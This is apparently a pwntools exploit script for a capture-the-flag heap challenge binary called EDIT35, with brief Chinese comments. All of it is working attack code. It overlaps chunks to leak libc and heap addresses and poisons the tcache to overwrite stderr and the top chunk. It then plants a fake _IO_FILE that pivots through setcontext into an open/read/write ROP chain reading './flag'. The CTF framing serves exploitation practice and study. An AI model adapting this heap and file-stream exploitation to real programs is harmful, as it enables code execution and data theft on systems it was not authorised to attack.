#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./EDIT35')
libc = ELF('./libc.so.6')
elf = ELF('./EDIT35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,size,content):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter(':',str(size))
	p.sendafter("content of heap:",content)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#=========================libcbase=============================

add(0x10) #0
add(0x420) #1 0x2b0
add(0x420) #2 0x6e0
add(0x420) #3 0xb10
add(0x400) #4

# gdb.attach(p)
# pause()

edit(0, 0x20, '\x00'*0x18 + p64(0x861)) # 修改 chunk3 pre_size 
delete(1)
delete(3) # chunk 1 2 3 合并
add(0x420) #5 use chunk1 0x2b0

show(2)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x219ce0 # unsoretedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#=========================key-heapbase=========================

add(0x400) #6 0x6e0
show(2)
key = u64(p.recv(24)[-8:].ljust(8, "\x00")) >> 12 # heap >> 12
heapbase = key << 12
pr('heapbase',heapbase)
pr('key',key)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
stderr_addr = libcbase + libc.sym['stderr']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
ret = prdi_ret + 1 # ret

#==========================stderr==============================
#在 unsortedbin 中分配，可以控制的是 6 (即chunk2的指针) 

add(0x400) #7 
delete(7) # tcachebin
delete(6) # tcachebin
stderr = key ^ stderr_addr
edit(2, 0x10, p64(stderr))

add(0x400) #8 tcachebin 0X6e0
add(0x400, p64(heapbase + 0x2b0)) #9 分配到 chunk2->fd 指向地址 stderr

#==========================top_size============================

delete(4)
delete(8)

top_size_addr = heapbase + 0x1350
top_size = key ^ top_size_addr
#ret = key ^ ret_addr
edit(2, 0x10, p64(top_size))
add(0x400) #10 tcachebin
add(0x400, p64(0) + p64(0x301)) #11 chunk2->fd 指向地址 top chunk

#======================fake_IO_FILE============================

context_addr  = heapbase + 0x6f0
IO_FILE_addr  = heapbase + 0x2b0

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(0) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(0) # _IO_buf_base
fake_IO_FILE += p64(1) + p64(0) # _IO_buf_base != _IO_buf_end
fake_IO_FILE += p64(context_addr) # rdx -> context_addr
fake_IO_FILE += p64(setcontext_door) # _IO_save_end = call(setcontext + 61)
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr + 0x30) # _wide_data = rax1
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10) # vtable = _IO_wfile_xsputn + 0x10 = _IO_wfile_seekoff
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(IO_FILE_addr + 0x40)  # rax2

#=============================orw==============================

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp -> orw
frame.rip  = ret

payload  = str(frame)
payload  = payload.ljust(0x100,'\x00')
flag_addr = context_addr + 0x200

# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

#==============================================================

edit(5, 0x400, fake_IO_FILE)
edit(2, 0x300, payload)

# gdb.attach(p)
# pause()

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x400))
p.interactive()
